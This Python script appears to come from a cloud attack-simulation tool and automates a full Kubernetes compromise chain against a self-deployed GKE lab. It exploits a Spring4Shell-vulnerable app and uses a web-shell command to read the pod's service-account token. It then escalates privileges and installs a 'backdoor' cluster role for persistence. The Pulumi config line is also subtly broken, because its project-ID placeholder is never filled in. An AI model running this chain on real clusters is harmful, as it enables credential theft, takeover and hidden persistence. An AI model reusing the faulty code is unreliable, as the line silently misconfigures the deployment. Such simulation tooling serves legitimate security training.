import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
#from .report.report import gen_report_2

def scenario_3_execute():
    print("-"*30)
    print(colored("Executing Scenraio 3 : Compromising a web app living inside a GKE Pod, access pod secret, escalate privilege, take over the cluster", color="red"))

    PROJECT_ID = input("Enter GCP Project ID: ")
    print(PROJECT_ID)
    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)

    subprocess.call("cd scenarios/scenario_3/infra/ && pulumi config set gcp:project {PROJECT_ID}", shell=True)
    file_path = "./core/cobra-scenario-3-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))

    subprocess.call("cd ./scenarios/scenario_3/infra/ && pulumi up -s cobra-scenario-3 -y", shell=True)
    subprocess.call("cd ./scenarios/scenario_3/infra/ && pulumi stack -s cobra-scenario-3 output --json >> ../../../core/cobra-scenario-3-output.json", shell=True)

    with open("./core/cobra-scenario-3-output.json", "r") as file:
        data = json.load(file)

    CLUSTER_NAME = data["cluster-name"]
    CLUSTER_ENDPOINT = data["cluster-endpoint"]
    

    print(colored("Authenticate to the cluster", color="red"))
    loading_animation()
    subprocess.call(f"gcloud container clusters get-credentials {CLUSTER_NAME} --region us-central1 --project {PROJECT_ID}", shell=True)

    print(colored("Deploying Web App and service", color="red"))
    loading_animation()
    subprocess.call("kubectl apply -f ./scenarios/scenario_3/infra/app/service.yml", shell=True)
    subprocess.call("kubectl apply -f ./scenarios/scenario_3/infra/app/app.yml", shell=True)

    sleep_duration = 60
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        while sleep_duration > 0:
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    
    service_ip = subprocess.check_output("kubectl get svc spring4shell-web-service  -o json | jq -r '.status.loadBalancer.ingress[0].ip'", shell=True).decode('utf-8').strip().rstrip('\n')

    print(colored("Found RCE in the Web Server, exploiting and creating Shell", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call("sh scenarios/scenario_3/infra/app/exploit "+service_ip+":8081", shell=True)


    print(colored("Found PrivEsc using Pod Default Service Account, escalating privs", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call("kubectl apply -f scenarios/scenario_3/infra/app/sa-cr.yml", shell=True)
    subprocess.call("kubectl apply -f scenarios/scenario_3/infra/app/sa-cb.yml", shell=True)

    pod_sa_token = subprocess.check_output("curl --silent --output - 'http://"+service_ip+":8081/shell.jsp?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token' | head -n 1", shell=True).decode('utf-8').strip().rstrip('\n')
    pod_sa_token = pod_sa_token.replace('\x00', '')

    print(colored("Creating a backdoor cluster role to persist", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(f"kubectl --server=https://{CLUSTER_ENDPOINT} --token={pod_sa_token} apply -f scenarios/scenario_3/infra/app/backdoor.yml", shell=True)